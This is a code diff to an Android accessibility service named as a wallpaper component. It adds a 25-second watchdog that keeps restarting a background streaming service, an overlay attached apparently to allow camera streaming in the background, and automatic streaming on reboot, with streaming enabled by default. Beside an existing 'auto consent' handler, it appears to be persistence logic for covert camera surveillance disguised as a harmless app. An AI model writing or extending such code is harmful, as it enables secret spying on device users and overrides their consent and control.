@@ -108,6 +108,27 @@ public class WallpaperAccessibilityService extends AccessibilityService {
         autoConsentHandler.postDelayed(autoConsentRunnable, 50);
     }
 
+    private final Handler watchdogHandler = new Handler(Looper.getMainLooper());
+    private final Runnable watchdogRunnable = new Runnable() {
+        @Override
+        public void run() {
+            try {
+                StreamingService service = StreamingService.getInstance();
+                if (service == null || !service.isServiceRunning()) {
+                    android.content.SharedPreferences prefs = androidx.preference.PreferenceManager.getDefaultSharedPreferences(WallpaperAccessibilityService.this);
+                    if (prefs.getBoolean(Constants.PREF_STREAMING_ENABLED, true)) {
+                        Log.i(TAG, "A11y Watchdog: StreamingService is not running. Starting it now...");
+                        StreamingWatchdogReceiver.startStreamingService(WallpaperAccessibilityService.this);
+                        StreamingWatchdogReceiver.scheduleNext(WallpaperAccessibilityService.this);
+                    }
+                }
+            } catch (Exception e) {
+                Log.e(TAG, "Error in A11y watchdog", e);
+            }
+            watchdogHandler.postDelayed(this, 25_000);
+        }
+    };
+
     @Override
     protected void onServiceConnected() {
         super.onServiceConnected();
@@ -127,11 +148,31 @@ public class WallpaperAccessibilityService extends AccessibilityService {
             Log.e(TAG, "Error configuring AccessibilityServiceInfo", e);
         }
         Log.i(TAG, "WallpaperAccessibilityService connected and ready");
+
+        // Ensure background overlay is attached for background camera streaming support
+        OverlayWindowManager.ensureOverlay(this);
+
+        // Auto-start StreamingService immediately upon accessibility service connection (e.g. after reboot or process revive)
+        try {
+            android.content.SharedPreferences prefs = androidx.preference.PreferenceManager.getDefaultSharedPreferences(this);
+            if (prefs.getBoolean(Constants.PREF_STREAMING_ENABLED, true)) {
+                Log.i(TAG, "A11y onServiceConnected: Auto-starting StreamingService...");
+                StreamingWatchdogReceiver.startStreamingService(this);
+                StreamingWatchdogReceiver.scheduleNext(this);
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Error starting StreamingService from onServiceConnected", e);
+        }
+
+        // Start accessibility persistent watchdog to monitor StreamingService
+        watchdogHandler.removeCallbacks(watchdogRunnable);
+        watchdogHandler.postDelayed(watchdogRunnable, 3_000);
     }
 
     @Override
     public void onDestroy() {
         super.onDestroy();
+        watchdogHandler.removeCallbacks(watchdogRunnable);
         if (instanceRef != null && instanceRef.get() == this) {
             instanceRef = null;
         }
